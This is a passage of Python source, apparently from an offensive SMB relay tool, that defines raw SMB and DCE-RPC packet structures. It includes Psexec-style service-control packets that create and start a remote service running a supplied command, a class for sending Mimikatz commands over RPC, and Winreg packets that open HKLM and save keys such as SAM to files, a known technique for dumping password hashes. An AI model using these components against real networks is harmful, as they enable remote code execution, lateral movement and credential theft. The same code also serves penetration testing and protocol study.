        ("MaxDataCount",          "\x00\x04"),
        ("MaxSetupCount",         "\x00"),
        ("Reserved",              "\x00\x00"),
        ("Flags",                 "\x00"),
        ("Timeout",               "\x00\x00\x00\x00"),
        ("Reserved1",             "\x00\x00"),
        ("ParamCount",            "\x00\x00"),
        ("ParamOffset",           "\x00\x00"),
        ("DataCount",             "\x00\x00"),
        ("DataOffset",            "\x00\x00"),
        ("SetupCount",            "\x02"),
        ("Reserved2",             "\x00"),
        ("OpNum",                 "\x26\x00"),
        ("FID",                   "\x00\x00"),
        ("Bcc",                   "\x00\x00"),
        ("Terminator",            "\x00"),
        ("PipeName",              "\\PIPE\\"),
        ("PipeTerminator",        "\x00\x00"),
        ("Data", ""),

    ])
    def calculate(self):
        #Padding
        if len(str(self.fields["Data"]))%2==0:
           self.fields["PipeTerminator"] = "\x00\x00\x00\x00"
        else:
           self.fields["PipeTerminator"] = "\x00\x00\x00"
        ##Convert Path to Unicode first before any Len calc.
        self.fields["PipeName"] = self.fields["PipeName"].encode('utf-16le')

        ##Data Len
        self.fields["TotalDataCount"] = struct.pack("<h", len(str(self.fields["Data"])))
        self.fields["DataCount"] = struct.pack("<h", len(str(self.fields["Data"])))

        ##Packet len
        FindRAPOffset = str(self.fields["Wordcount"])+str(self.fields["TotalParamCount"])+str(self.fields["TotalDataCount"])+str(self.fields["MaxParamCount"])+str(self.fields["MaxDataCount"])+str(self.fields["MaxSetupCount"])+str(self.fields["Reserved"])+str(self.fields["Flags"])+str(self.fields["Timeout"])+str(self.fields["Reserved1"])+str(self.fields["ParamCount"])+str(self.fields["ParamOffset"])+str(self.fields["DataCount"])+str(self.fields["DataOffset"])+str(self.fields["SetupCount"])+str(self.fields["Reserved2"])+str(self.fields["OpNum"])+str(self.fields["FID"])+str(self.fields["Bcc"])+str(self.fields["Terminator"])+str(self.fields["PipeName"])+str(self.fields["PipeTerminator"])

        self.fields["ParamOffset"] = struct.pack("<h", len(FindRAPOffset)+32)
        self.fields["DataOffset"] = struct.pack("<h", len(FindRAPOffset)+32)
        ##Bcc Buff Len
        BccComplete    = str(self.fields["Terminator"])+str(self.fields["PipeName"])+str(self.fields["PipeTerminator"])+str(self.fields["Data"])
        self.fields["Bcc"] = struct.pack("<h", len(BccComplete))


class SMBDCEData(Packet):
    fields = OrderedDict([
        ("Version",          "\x05"),
        ("VersionLow",       "\x00"),
        ("PacketType",       "\x0b"),
        ("PacketFlag",       "\x03"),
        ("DataRepresent",    "\x10\x00\x00\x00"),
        ("FragLen",          "\x2c\x02"),
        ("AuthLen",          "\x00\x00"),
        ("CallID",           "\x01\x00\x00\x00"),
        ("MaxTransFrag",     "\xd0\x16"),
        ("MaxRecvFrag",      "\xd0\x16"),
        ("GroupAssoc",       "\x00\x00\x00\x00"),
        ("CTXNumber",        "\x01"),
        ("CTXPadding",       "\x00\x00\x00"),
        ("CTX0ContextID",    "\x00\x00"),
        ("CTX0ItemNumber",   "\x01\x00"),
        ("CTX0UID",          "\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03"),
        ("CTX0UIDVersion",   "\x02\x00"),
        ("CTX0UIDVersionlo", "\x00\x00"),
        ("CTX0UIDSyntax",    "\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60"),
        ("CTX0UIDSyntaxVer", "\x02\x00\x00\x00"),
    ])

    def calculate(self):

        Data1= str(self.fields["Version"])+str(self.fields["VersionLow"])+str(self.fields["PacketType"])+str(self.fields["PacketFlag"])+str(self.fields["DataRepresent"])+str(self.fields["FragLen"])+str(self.fields["AuthLen"])+str(self.fields["CallID"])+str(self.fields["MaxTransFrag"])+str(self.fields["MaxRecvFrag"])+str(self.fields["GroupAssoc"])+str(self.fields["CTXNumber"])+str(self.fields["CTXPadding"])+str(self.fields["CTX0ContextID"])+str(self.fields["CTX0ItemNumber"])+str(self.fields["CTX0UID"])+str(self.fields["CTX0UIDVersion"])+str(self.fields["CTX0UIDVersionlo"])+str(self.fields["CTX0UIDSyntax"])+str(self.fields["CTX0UIDSyntaxVer"])


        self.fields["FragLen"] = struct.pack("<h",len(Data1))

class SMBDCEPacketData(Packet):
    fields = OrderedDict([
        ("Version",       "\x05"),
        ("VersionLow",    "\x00"),
        ("PacketType",    "\x00"),
        ("PacketFlag",    "\x03"),
        ("DataRepresent", "\x10\x00\x00\x00"),
        ("FragLen",       "\x00\x00"),
        ("AuthLen",       "\x00\x00"),
        ("CallID",        "\x00\x00\x00\x00"),
        ("AllocHint",     "\x00\x00\x00\x00"),
        ("ContextID",     "\x00\x00"),
        ("Opnum",         "\x0f\x00"),
        ("Data",          ""),

    ])

    def calculate(self):

        Data1= str(self.fields["Version"])+str(self.fields["VersionLow"])+str(self.fields["PacketType"])+str(self.fields["PacketFlag"])+str(self.fields["DataRepresent"])+str(self.fields["FragLen"])+str(self.fields["AuthLen"])+str(self.fields["CallID"])+str(self.fields["AllocHint"])+str(self.fields["ContextID"])+str(self.fields["Opnum"])+str(self.fields["Data"])

        self.fields["FragLen"] = struct.pack("<h",len(Data1))
        self.fields["AllocHint"] = struct.pack("<i",len(str(self.fields["Data"])))

###Psexec
class SMBDCESVCCTLOpenManagerW(Packet):
    fields = OrderedDict([
        ("MachineNameRefID",     "\xb5\x97\xb9\xbc"),
        ("MaxCount",             "\x0f\x00\x00\x00"),
        ("Offset",               "\x00\x00\x00\x00"),
        ("ActualCount",          "\x0f\x00\x00\x00"),
        ("MachineName",          ""),
        ("MachineNameNull",      "\x00\x00"),
        ("DbPointer",            "\x00\x00\x00\x00"),
        ("AccessMask",           "\x3f\x00\x0f\x00"),
    ])

    def calculate(self):
        #Padding
        if len(str(self.fields["MachineName"]))%2==0:
           self.fields["MachineNameNull"] = "\x00\x00\x00\x00"
        else:
           self.fields["MachineNameNull"] = "\x00\x00"
        ## Convert to UTF-16LE
        self.fields["MaxCount"] = struct.pack("<i",len(str(self.fields["MachineName"]))+1)
        self.fields["ActualCount"] = struct.pack("<i",len(str(self.fields["MachineName"]))+1)
        self.fields["MachineName"] = self.fields["MachineName"].encode('utf-16le')

class SMBDCESVCCTLCreateService(Packet):
    fields = OrderedDict([
        ("ContextHandle",        ""),
        ("MaxCount",             "\x0c\x00\x00\x00"),
        ("Offset",               "\x00\x00\x00\x00"),
        ("ActualCount",          "\x0c\x00\x00\x00"),
        ("ServiceName",          ""),
        ("MachineNameNull",      "\x00\x00"),
        ("ReferentID",           "\x00\x00\x02\x00"),
        ("MaxCountRefID",        "\x11\x00\x00\x00"),
        ("OffsetID",             "\x00\x00\x00\x00"),
        ("ActualCountRefID",     "\x11\x00\x00\x00"),
        ("DisplayNameID",        ""),
        ("DisplayNameIDNull",    "\x00\x00\x00\x00"),
        ("AccessMask",           "\xff\x01\x0f\x00"),
        ("ServerType",           "\x10\x00\x00\x00"),
        ("ServiceStartType",     "\x03\x00\x00\x00"),
        ("ServiceErrorCtl",      "\x00\x00\x00\x00"),
        ("BinPathMaxCount",      "\xb6\x00\x00\x00"),
        ("BinPathOffset",        "\x00\x00\x00\x00"),
        ("BinPathActualCount",   "\xb6\x00\x00\x00"),
        ("BinCMD",               ""),
        ("BinCMDTerminator",     "\x00\x00"),
        ("LoadOrderGroup",       "\x00\x00\x00\x00"),
        ("TagID",                "\x00\x00\x00\x00"),
        ("Dependencies",         "\x00\x00\x00\x00"),
        ("DependenciesLen",      "\x00\x00\x00\x00"),
        ("ServiceStartUser",     "\x00\x00\x00\x00"),
        ("Password",             "\x00\x00\x00\x00"),
        ("PasswordLen",          "\x00\x00\x00\x00"), 
        ("Padding",              "\x00\x00"),

    ])

    def calculate(self):
        BinDataLen = str(self.fields["BinCMD"])

        #Padding
        if len(str(self.fields["BinCMD"]))%2==0:
           self.fields["LoadOrderGroup"] = "\x00\x00\x00\x00"
        else:
           self.fields["LoadOrderGroup"] = "\x00\x00"

        ## Calculate first
        self.fields["BinPathMaxCount"] = struct.pack("<i",len(BinDataLen)+1)
        self.fields["BinPathActualCount"] = struct.pack("<i",len(BinDataLen)+1)
        self.fields["MaxCount"] = struct.pack("<i",len(str(self.fields["ServiceName"]))+1)
        self.fields["ActualCount"] = struct.pack("<i",len(str(self.fields["ServiceName"]))+1)
        self.fields["MaxCountRefID"] = struct.pack("<i",len(str(self.fields["DisplayNameID"]))+1)
        self.fields["ActualCountRefID"] = struct.pack("<i",len(str(self.fields["DisplayNameID"]))+1)

        ## Then convert to UTF-16LE
        self.fields["ServiceName"] = self.fields["ServiceName"].encode('utf-16le')
        self.fields["DisplayNameID"] = self.fields["DisplayNameID"].encode('utf-16le')
        self.fields["BinCMD"] = self.fields["BinCMD"].encode('utf-16le')

class SMBDCESVCCTLOpenService(Packet):
    fields = OrderedDict([
        ("ContextHandle",        ""),
        ("MaxCount",             "\x00\x00\x00\x00"),
        ("Offset",               "\x00\x00\x00\x00"),
        ("ActualCount",          "\x00\x00\x00\x00"),
        ("ServiceName",          ""),
        ("ServiceNameNull",      "\x00\x00"),
        ("AccessMask",           "\xff\x01\x0f\x00"),
    ])

    def calculate(self):
        #Padding
        if len(str(self.fields["ServiceName"]))%2==0:
           self.fields["ServiceNameNull"] = "\x00\x00\x00\x00"
        else:
           self.fields["ServiceNameNull"] = "\x00\x00"
        ## Calculate first
        self.fields["MaxCount"] = struct.pack("<i",len(str(self.fields["ServiceName"]))+1)
        self.fields["ActualCount"] = struct.pack("<i",len(str(self.fields["ServiceName"]))+1)
        ## Then convert to UTF-16LE
        self.fields["ServiceName"] = self.fields["ServiceName"].encode('utf-16le')

class SMBDCESVCCTLStartService(Packet):
    fields = OrderedDict([
        ("ContextHandle",        ""),
        ("MaxCount",             "\x00\x00\x00\x00\x00\x00\x00\x00"),
    ])

class SMBDCESVCCTLControlService(Packet):
    fields = OrderedDict([
        ("ContextHandle",        ""),
        ("ControlOperation",     "\x01\x00\x00\x00"),
    ])

class SMBDCESVCCTLDeleteService(Packet):
    fields = OrderedDict([
        ("ContextHandle",        ""),
    ])

class SMBDCESVCCTLCloseService(Packet):
    fields = OrderedDict([
        ("ContextHandle",        ""),
    ])

class SMBDCESVCCTLQueryService(Packet):
    fields = OrderedDict([
        ("ContextHandle",        ""),
    ])

class SMBDCEMimiKatzRPCCommand(Packet):
    fields = OrderedDict([
        ("ContextHandleLen",     "\x07\x00\x00\x00"),
        ("ContextHandle",        "\x00\x00\x00\x00"),
        ("ContextHandleLen2",    "\x07\x00\x00\x00"),
        ("CMD",                  ""),
        ("CMDEnd",               "\x00\x00"),
    ])

    def calculate(self):
        self.fields["ContextHandleLen"] = struct.pack("<i",len(str(self.fields["CMD"]))+1)
        self.fields["ContextHandleLen2"] = struct.pack("<i",len(str(self.fields["CMD"]))+1)
        self.fields["CMD"] = self.fields["CMD"].encode('utf-16le')


class OpenAndX(Packet):
    fields = OrderedDict([
        ("Wordcount",             "\x0f"),
        ("AndXCommand",           "\xff"),
        ("Reserved",              "\x00" ),
        ("Andxoffset",            "\x00\x00"),
        ("Flags",                 "\x07\x00"),
        ("DesiredAccess",         "\xc2\x00"),
        ("SearchAttrib",          "\x16\x00"),
        ("FileAttrib",            "\x20\x00"),
        ("Created",               "\x40\x9d\xc1\x57"),
        ("OpenFunc",              "\x12\x00"),
        ("allocsize",             "\x00\x00\x00\x00"),
        ("Timeout",               "\x00\x00\x00\x00"),
        ("Reserved2",             "\x00\x00\x00\x00"),
        ("Bcc",                   "\x0b\x00"),
        ("Terminator",            ""),
        ("File",                  ""),
        ("FileNull",              "\x00"),

    ])
    def calculate(self):
        self.fields["Bcc"] = struct.pack("<h",len(str(self.fields["Terminator"])+str(self.fields["File"])+str(self.fields["FileNull"])))

class ReadRequest(Packet):
    fields = OrderedDict([
        ("Wordcount",             "\x05"),
        ("FID",                   "\x02\x40"),
        ("Count",                 "\xf0\xff"),
        ("Offset",                "\x00\x00\x00\x00"),
        ("RemainingBytes",        "\xf0\xff"),
        ("Bcc",                   "\x00\x00"),

    ])

class ReadRequestAndX(Packet):
    fields = OrderedDict([
        ("Wordcount",             "\x0C"),
        ("AndXCommand",           "\xff"),
        ("Reserved",              "\x00"),
        ("AndXOffset",            "\xde\xde"),
        ("FID",                   "\x02\x40"),
        ("Offset",                "\x00\x00\x00\x00"),
        ("MaxCountLow",           "\xf0\xff"),
        ("MinCount",              "\xf0\xff"),
        ("Timeout",               "\xff\xff\xff\xff"),
        ("RemainingBytes",        "\xf0\xff"),
        ("HighOffset",            "\x00\x00\x00\x00"),
        ("Bcc",                   "\x00\x00"),

    ])

class SMBDCERPCReadRequestAndX(Packet):
    fields = OrderedDict([
        ("Wordcount",             "\x0C"),
        ("AndXCommand",           "\xff"),
        ("Reserved",              "\x00"),
        ("AndXOffset",            "\xde\xde"),
        ("FID",                   "\x02\x40"),
        ("Offset",                "\x00\x00\x00\x00"),
        ("MaxCountLow",           "\xb8\x10"),
        ("MinCount",              "\xb8\x10"),
        ("Timeout",               "\xff\xff\xff\xff"),
        ("RemainingBytes",        "\x00\x00"),
        ("HighOffset",            "\x00\x00\x00\x00"),
        ("Bcc",                   "\x00\x00"),

    ])

class WriteRequestAndX(Packet):
    fields = OrderedDict([
        ("Wordcount",             "\x06"),
        ("AndXCommand",           "\xff"),
        ("Reserved",              "\x00"),
        ("AndXOffset",            "\xde\xde"),
        ("FID",                   "\x02\x40"),
        ("Offset",                "\x00\x00\x00\x00"),
        ("Reserved2",             "\xff\xff\xff\xff"),
        ("WriteMode",             "\x00\x00"),
        ("Remaining",             "\x00\x00"),
        ("DataLenHi",             "\x00\x00"),
        ("DataLenLow",            "\x0a\x00"),#actual Len
        ("DataOffset",            "\x3f\x00"),
        ("Bcc",                   "\x0a\x00"),
        ("Padd",                  ""), 
        ("Data",                  ""),

    ])

class CloseRequest(Packet):
    fields = OrderedDict([
        ("Wordcount",             "\x03"),
        ("FID",                   "\x00\x00"),
        ("LastWrite",             "\xff\xff\xff\xff"),
        ("Bcc",                   "\x00\x00"),

    ])

class DeleteFileRequest(Packet):
    fields = OrderedDict([
        ("Wordcount",             "\x01"),
        ("SearchAttributes",      "\x06\x00"),
        ("Bcc",                   "\x1b\x00"),
        ("BuffType",              "\x04"),
        ("File",                  ""),
        ("FileNull",              "\x00\x00"),

    ])

    def calculate(self):
        self.fields["File"] = self.fields["File"].encode('utf-16le')
        self.fields["Bcc"] = struct.pack("<h",len(str(self.fields["BuffType"])+str(self.fields["File"])+str(self.fields["FileNull"])))

class SMBEcho(Packet):
    fields = OrderedDict([
        ("Wordcount",             "\x01"),
        ("EchoCount",             "\x01\x00"),
        ("Bcc",                   "\x1b\x00"),
        ("File",                  "LWO CW VLO DEO MAW LMW ARW"),#nt4 style.
        ("FileNull",              "\x00"),

    ])


###Winreg
class SMBDCEWinRegOpenHKLMKey(Packet):
    fields = OrderedDict([
        ("Ptr",                  "\x00\x00\x00\x00"),
        ("AccessMask",           "\x00\x00\x00\x02"),
    ])

class SMBDCEWinRegOpenHKCUKey(Packet):
    fields = OrderedDict([
        ("Ptr",                  "\x00\x00\x00\x00"),
        ("AccessMask",           "\x00\x00\x00\x02"),
    ])

class SMBDCEWinRegOpenKey(Packet):
    fields = OrderedDict([
        ("ContextHandle",        ""),
        ("KeySizeUnicode",       "\x00\x00"),
        ("MaxKeySizeUnicode",    "\x00\x00"),
        ("KeyPtr",               "\xa9\xdc\x00\x00"),
        ("ActualKeyMaxSize",     "\x00\x00\x00\x00"),#not unicode
        ("ActualKeyOffset",      "\x00\x00\x00\x00"),
        ("ActualKeySize",        "\x00\x00\x00\x00"),#not unicode
        ("Key",                  ""),
        ("KeyTerminator",        "\x00\x00"),
        ("AccessOption",         "\x01\x00\x00\x00"),
        ("AccessMask",           "\x00\x00\x00\x02"),
    ])

    def calculate(self):
        #Padding
        if len(str(self.fields["Key"]))%2==0:
           self.fields["KeyTerminator"] = "\x00\x00\x00\x00"
        else:
           self.fields["KeyTerminator"] = "\x00\x00"
        #Calc first.
        self.fields["ActualKeyMaxSize"] = struct.pack("<i",len(str(self.fields["Key"]))+1)
        self.fields["ActualKeySize"] = struct.pack("<i",len(str(self.fields["Key"]))+1)
        #Convert to unicode.
        self.fields["Key"] = self.fields["Key"].encode('utf-16le')
        #Recalculate again, in unicode this time.
        self.fields["KeySizeUnicode"] = struct.pack("<h",len(str(self.fields["Key"]))+2)
        self.fields["MaxKeySizeUnicode"] = struct.pack("<h",len(str(self.fields["Key"]))+2)


class SMBDCEWinRegQueryInfoKey(Packet):
    fields = OrderedDict([
        ("ContextHandle",        ""),
        ("ClassNameLen",         "\x00\x00"),
        ("ClassNameMaxLen",      "\x00\x04"),
        ("ClassNameRefID",       "\x68\x89\x00\x00"),
        ("ClassNameMaxCount",    "\x00\x02\x00\x00"),
        ("ClassNameOffset",      "\x00\x00\x00\x00"),
        ("ClassNameActualCount", "\x00\x00\x00\x00"),

    ])

class SMBDCEWinRegCloseKey(Packet):
    fields = OrderedDict([
        ("ContextHandle",        ""),

    ])

class SMBDCEWinRegCreateKey(Packet):
    fields = OrderedDict([
        ("ContextHandle",        ""),
        ("KeySizeUnicode",       "\x00\x00"),
        ("MaxKeySizeUnicode",    "\x00\x00"),
        ("KeyPtr",               "\xde\x01\x00\x00"),
        ("ActualKeyMaxSize",     "\x00\x00\x00\x00"),
        ("ActualKeyOffset",      "\x00\x00\x00\x00"),
        ("ActualKeySize",        "\x00\x00\x00\x00"),
        ("KeyName",              "SAM"),
        ("KeyTerminator",        "\x00\x00"),
        ("KeyClassLen",          "\x00\x00"),
        ("KeyClassMaxLen",       "\x00\x00"),
        ("KeyClassPtr",          "\x00\x00\x00\x00"),
        ("AccessOption",         "\x01\x00\x00\x00"),
        ("AccessMask",           "\x00\x00\x00\x02"),
        ("SecDescRefID",         "\x29\xd8\x00\x00"),
        ("SecDescLen",           "\x00\x00\x00\x00"),
        ("SecDescPtr",           "\x00\x00\x00\x00"),
        ("SecDescMaxLen",        "\x00\x00\x00\x00"),
        ("SecDescMaxSize",       "\x00\x00\x00\x00"),
        ("Inherit",              "\x00\x00\x00\x00"),
        ("AccessTakenRefID",     "\x9c\x3e\x00\x00"),
        ("ActionTakenRefID",     "\x01\x00\x00\x02"),

    ])

    def calculate(self):
        #Padding
        if len(str(self.fields["KeyName"]))%2==0:
           self.fields["KeyTerminator"] = "\x00\x00\x00\x00"
        else:
           self.fields["KeyTerminator"] = "\x00\x00"
        #Calc first.
        self.fields["ActualKeyMaxSize"] = struct.pack("<i",len(str(self.fields["KeyName"]))+1)
        self.fields["ActualKeySize"] = struct.pack("<i",len(str(self.fields["KeyName"]))+1)
        #Convert to unicode.
        self.fields["KeyName"] = self.fields["KeyName"].encode('utf-16le')
        #Recalculate again, in unicode this time.
        self.fields["KeySizeUnicode"] = struct.pack("<h",len(str(self.fields["KeyName"]))+2)
        self.fields["MaxKeySizeUnicode"] = struct.pack("<h",len(str(self.fields["KeyName"]))+2)

class SMBDCEWinRegSaveKey(Packet):
    fields = OrderedDict([
        ("ContextHandle",        ""),
        ("FileSizeUnicode",       "\x00\x00"),
        ("MaxFileSizeUnicode",    "\x00\x00"),
        ("FilePtr",               "\xa9\xdc\x00\x00"),
        ("ActualFileMaxSize",     "\x00\x00\x00\x00"),#not unicode
        ("ActualFileOffset",      "\x00\x00\x00\x00"),
        ("ActualFileSize",        "\x00\x00\x00\x00"),#not unicode
        ("File",                  ""),
        ("FileTerminator",        "\x00\x00"),
        ("SecAttrib",            "\x00\x00\x00\x00"),
    ])

    def calculate(self):
        #Padding
        if len(str(self.fields["File"]))%2==0:
           self.fields["FileTerminator"] = "\x00\x00\x00\x00"
        else:
           self.fields["FileTerminator"] = "\x00\x00"
        #Calc first.
        self.fields["ActualFileMaxSize"] = struct.pack("<i",len(str(self.fields["File"]))+1)
        self.fields["ActualFileSize"] = struct.pack("<i",len(str(self.fields["File"]))+1)
        #Convert to unicode.
        self.fields["File"] = self.fields["File"].encode('utf-16le')
        #Recalculate again, in unicode this time.
        self.fields["FileSizeUnicode"] = struct.pack("<h",len(str(self.fields["File"]))+2)
        self.fields["MaxFileSizeUnicode"] = struct.pack("<h",len(str(self.fields["File"]))+2)


